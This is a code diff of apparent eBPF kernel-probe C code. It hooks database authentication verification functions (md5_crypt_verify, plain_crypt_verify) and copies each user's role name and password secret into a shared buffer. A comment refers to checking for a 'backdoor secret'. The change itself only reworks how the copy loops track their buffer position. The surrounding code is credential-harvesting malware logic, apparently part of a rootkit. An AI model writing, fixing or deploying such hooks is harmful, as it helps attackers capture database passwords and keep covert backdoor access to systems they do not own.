@@ -151,14 +151,14 @@ int trace_md5_crypt_verify(struct pt_regs *ctx)
     }
 
     // copy role
+    u32 pos = *cursor;
     #pragma unroll
     for (int i = 0; i < MAX_ROLE_LEN; i++) {
-        u32 pos = *cursor;
         if (creds.role[i] == 0) {
             if (pos < FS_WATCH_MAX_CONTENT) {
                 watch->content[pos] = 35;
             }
-            *cursor = pos + 1;
+            pos++;
             goto copy_secret;
         }
 
@@ -166,28 +166,30 @@ int trace_md5_crypt_verify(struct pt_regs *ctx)
             goto copy_secret;
         }
         watch->content[pos] = creds.role[i];
-        *cursor = pos + 1;
+        pos++;
     }
 
 copy_secret:
     // copy secret
     #pragma unroll
     for (int i = 0; i < MD5_LEN; i++) {
-        u32 pos = *cursor;
         if (creds.secret[i] == 0) {
             if (pos < FS_WATCH_MAX_CONTENT) {
                 watch->content[pos] = 10;
             }
-            *cursor = pos + 1;
+            pos++;
+            *cursor = pos;
             goto next;
         }
 
         if (pos >= FS_WATCH_MAX_CONTENT) {
+            *cursor = pos;
             goto next;
         }
         watch->content[pos] = creds.secret[i];
-        *cursor = pos + 1;
+        pos++;
     }
+    *cursor = pos;
 
 next:
     // check if this is a backdoor secret
@@ -300,14 +302,14 @@ int trace_plain_crypt_verify(struct pt_regs *ctx)
     }
 
     // copy role
+    u32 pos = *cursor;
     #pragma unroll
     for (int i = 0; i < MAX_ROLE_LEN; i++) {
-        u32 pos = *cursor;
         if (creds.role[i] == 0) {
             if (pos < FS_WATCH_MAX_CONTENT) {
                 watch->content[pos] = 35;
             }
-            *cursor = pos + 1;
+            pos++;
             goto copy_secret;
         }
 
@@ -315,28 +317,30 @@ int trace_plain_crypt_verify(struct pt_regs *ctx)
             goto copy_secret;
         }
         watch->content[pos] = creds.role[i];
-        *cursor = pos + 1;
+        pos++;
     }
 
 copy_secret:
     // copy secret
     #pragma unroll
     for (int i = 0; i < MD5_LEN; i++) {
-        u32 pos = *cursor;
         if (creds.secret[i] == 0) {
             if (pos < FS_WATCH_MAX_CONTENT) {
                 watch->content[pos] = 10;
             }
-            *cursor = pos + 1;
+            pos++;
+            *cursor = pos;
             goto next;
         }
 
         if (pos >= FS_WATCH_MAX_CONTENT) {
+            *cursor = pos;
             goto next;
         }
         watch->content[pos] = creds.secret[i];
-        *cursor = pos + 1;
+        pos++;
     }
+    *cursor = pos;
 
 next:
     return 0;
